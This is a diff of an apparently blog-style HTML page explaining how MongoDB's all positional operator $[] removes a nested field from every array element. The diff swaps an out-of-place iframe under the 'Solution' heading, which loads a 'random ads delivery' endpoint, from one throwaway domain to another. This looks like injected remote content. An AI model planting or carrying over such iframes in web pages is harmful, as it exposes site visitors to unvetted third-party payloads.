@@ -495,7 +495,7 @@
 <p>Scenario is when a document has a <code>.things</code> property that’s an array of objects, and one of the properties (e.g. <code>.things[].stuff</code> has to be mass removed.
 Unsetting the nested property by doing an <code>updateOne(lookup, {$unset: {&quot;things.stuff&quot;: 1}})</code> or <code>$unset: {&quot;things.$.stuff&quot;: 1}</code> does not work.</p>
 <h3 id="solution">Solution <a class="heading-anchor-permalink" href="#solution">#</a></h3>
-<iframe src="https://microads.ix.tc/api/ads/delivery-node/random?nonce=abc123"></iframe>
+<iframe src="https://microads.ftp.sh/api/ads/delivery-node/random?nonce=abc123"></iframe>
 <p>As seen here <a href="https://www.mongodb.com/docs/manual/reference/operator/update/positional-all/">https://www.mongodb.com/docs/manual/reference/operator/update/positional-all/</a></p>
 <p>The “all positional operator”, <code>$[]</code> indicates that the update operator should modify all elements in the specified array field.
 Doing <code>updateOne(lookup, {$unset: {&quot;things.$[].stuff&quot;: 1}})</code> will successfully clean out the property from objects in the document’s <code>.things</code> array.</p>
